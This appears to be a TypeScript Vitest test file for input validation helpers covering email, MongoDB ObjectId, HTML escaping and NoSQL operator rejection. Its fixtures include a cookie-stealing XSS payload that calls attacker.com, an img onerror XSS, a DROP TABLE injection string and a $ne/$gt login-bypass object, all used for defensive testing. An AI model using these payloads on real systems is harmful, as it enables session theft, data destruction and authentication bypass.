import { describe, it, expect } from "vitest";

/**
 * Security & Input Validation Helpers
 */

function isValidEmail(email: string): boolean {
  if (!email || typeof email !== "string" || email.length > 254) return false;
  // Disallow consecutive dots or HTML characters
  if (email.includes("..") || email.includes("<") || email.includes(">")) return false;
  // Strict RFC 5322 regex validation
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.[a-zA-Z]{2,}$/;
  return emailRegex.test(email);
}

function isValidObjectId(id: string): boolean {
  if (!id || typeof id !== "string") return false;
  const objectIdRegex = /^[0-9a-fA-F]{24}$/;
  return objectIdRegex.test(id);
}

function sanitizeUserInput(text: string): string {
  if (typeof text !== "string") return "";
  return text
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;")
    .replace(/\//g, "&#x2F;");
}

function preventNoSQLQueryInjection(input: any): any {
  if (typeof input === "object" && input !== null) {
    if (Array.isArray(input)) {
      return input.map(preventNoSQLQueryInjection);
    }
    const cleanObj: Record<string, any> = {};
    for (const key of Object.keys(input)) {
      // Reject any MongoDB operators like $ne, $gt, $where
      if (key.startsWith("$")) {
        throw new Error(`Security Violation: MongoDB query operator '${key}' is prohibited in user input.`);
      }
      cleanObj[key] = preventNoSQLQueryInjection(input[key]);
    }
    return cleanObj;
  }
  return input;
}

describe("Security Audit & Input Hardening", () => {
  describe("Email Validation", () => {
    it("should accept valid email addresses", () => {
      expect(isValidEmail("adityath2305@gmail.com")).toBe(true);
      expect(isValidEmail("user.name+tag@gitam.in")).toBe(true);
    });

    it("should reject malicious or invalid email formats", () => {
      expect(isValidEmail("")).toBe(false);
      expect(isValidEmail("plainaddress")).toBe(false);
      expect(isValidEmail("user@domain..com")).toBe(false);
      expect(isValidEmail("user@domain")).toBe(false);
      expect(isValidEmail("<script>alert(1)</script>@domain.com")).toBe(false);
    });
  });

  describe("MongoDB ObjectId Validation", () => {
    it("should accept valid 24-character hex ObjectIds", () => {
      expect(isValidObjectId("6a4c73d185dcfe8a2843fb2f")).toBe(true);
      expect(isValidObjectId("507f1f77bcf86cd799439011")).toBe(true);
    });

    it("should reject invalid or malicious ObjectId attempts", () => {
      expect(isValidObjectId("")).toBe(false);
      expect(isValidObjectId("12345")).toBe(false);
      expect(isValidObjectId("6a4c73d185dcfe8a2843fb2g")).toBe(false); // invalid hex 'g'
      expect(isValidObjectId("6a4c73d185dcfe8a2843fb2f; DROP TABLE users;")).toBe(false);
    });
  });

  describe("XSS & HTML Injection Sanitization", () => {
    it("should escape script tags and dangerous HTML attributes", () => {
      const malicious = '<script>fetch("http://attacker.com/cookie?c="+document.cookie)</script>';
      const sanitized = sanitizeUserInput(malicious);
      expect(sanitized).not.toContain("<script>");
      expect(sanitized).toContain("&lt;script&gt;");
    });

    it("should sanitize img onerror event handlers", () => {
      const imgPayload = '<img src=x onerror="alert(\'XSS\')">';
      const sanitized = sanitizeUserInput(imgPayload);
      expect(sanitized).not.toContain("<img");
      expect(sanitized).toContain("&lt;img");
    });
  });

  describe("NoSQL Query Injection Prevention", () => {
    it("should reject payloads containing MongoDB query operators ($ne, $gt, $where)", () => {
      const maliciousPayload = {
        email: { "$ne": null },
        password: { "$gt": "" },
      };

      expect(() => preventNoSQLQueryInjection(maliciousPayload)).toThrow(
        "MongoDB query operator '$ne' is prohibited"
      );
    });

    it("should pass safe scalar JSON user inputs", () => {
      const safePayload = {
        name: "Aditya",
        age: 21,
        goal: "recomp",
        allergies: ["peanuts", "dairy"],
      };

      expect(() => preventNoSQLQueryInjection(safePayload)).not.toThrow();
      expect(preventNoSQLQueryInjection(safePayload)).toEqual(safePayload);
    });
  });
});
